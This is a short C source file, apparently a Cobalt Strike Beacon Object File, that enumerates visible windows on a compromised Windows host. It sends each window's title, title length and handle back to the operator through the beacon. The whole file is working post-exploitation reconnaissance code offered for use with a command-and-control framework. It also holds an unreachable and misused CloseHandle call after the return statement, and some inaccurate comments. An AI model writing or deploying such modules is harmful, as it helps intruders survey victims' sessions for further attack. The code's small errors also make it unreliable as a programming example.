#include "beacon.h" // For Cobalt apis.
#include <windows.h> // Windows api of course.

// Imports for it to work.
DECLSPEC_IMPORT BOOL WINAPI USER32$EnumWindows(WNDENUMPROC lpEnumFunc, LPARAM lparam);

DECLSPEC_IMPORT int WINAPI USER32$GetWindowTextA(HWND hwnd, LPSTR lpString, int nMaxCount);

DECLSPEC_IMPORT BOOL WINAPI USER32$IsWindowVisible(HWND hwnd);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

// EnumWindowsProc function.
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lparam) {
	char windowname[256]; // Max length of the window.
	int b = USER32$GetWindowTextA(hwnd, windowname, 256); // Parameters for GetWindowTextA, it's a integer
	if (USER32$IsWindowVisible(hwnd) == TRUE) {
    // Print information below.
		BeaconPrintf(CALLBACK_OUTPUT, "Window name is %s\n", windowname);
		BeaconPrintf(CALLBACK_OUTPUT, "Window text is %d\n", b);
		BeaconPrintf(CALLBACK_OUTPUT, "Handle information %p\n", hwnd);
	}
	return TRUE; // Return true.
	KERNEL32$CloseHandle(hwnd); // Close handle.
}

void go() { // Entrypoint for coffloader to exec.
	USER32$EnumWindows(EnumWindowsProc, 0); // Calling the function.
}
